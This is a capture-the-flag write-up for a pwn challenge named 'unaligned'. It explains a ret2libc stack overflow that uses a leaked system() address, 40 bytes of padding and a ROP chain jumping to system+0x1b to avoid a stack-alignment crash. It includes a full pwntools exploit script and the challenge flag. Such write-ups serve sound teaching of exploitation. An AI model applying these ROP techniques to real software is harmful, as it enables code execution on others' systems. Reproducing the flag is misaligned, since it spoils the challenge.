
# Challenge description

When executed, the binary gives you a gift (an address) and then prompts you to enter a name, then whatever your input is you'll receive a segmentation fault, how strange!!

# Solution

After debugging the binary, we see that the gift address is the address of the libc function system,
so the solution to the challenge might be a ret2libc.

We also notice that we can input 40 characters until we reach a return address.

After getting the base address of libc and getting the address of '/bin/sh', we construct our ROP chain using gadgets present in libc.

So our payload basically looks like this :
    
    Padding + address of POP_RDI + address of /bin/sh + address of SYSTEM

But when run, we still get a segmentation fault.

After checking, we see that the function `system('/bin/sh')` does get executed, but the segmentation fault arises from within it.

After disassembling the system, we notice that it performs a function call to `do_system()` at offset 0x1b, let's try to jump directly to that call.

Let's try the following payload:

    Padding + address of POP_RDI + address of /bin/sh + address of SYSTEM + 0x1b

We run it, and sure enough, we get a shell :).

# Solve Script

```python
from pwn import *

elf = ELF('./unaligned')
context.binary = elf
p = process(elf.path)
#p = remote(host='unaligned.bsides.shellmates.club', port=443, ssl=True)
libc = ELF('./libc.so.6')

p.recvuntil('Gift: ')
system = int(p.recv(14), 16)

log.warn('system offset at : ' + str(hex(libc.symbols['system'])))

libc.address = system - libc.symbols['system']

log.warn('system at : ' + str(hex(system)))

bin_sh = p64(next(libc.search(b'/bin/sh\0')))

padding = b'B' * 40

system = p64(system + 0x1b)

pop_rdi = p64(libc.address + 0x2164f)

p.sendline(padding + pop_rdi + bin_sh + system)

p.interactive()
```

# Flag

`shellmates{SOrRY_fOR_f0RciBLy_Un$4tify1ng_0ne_g4DGet_CoN$tr41nT$}`
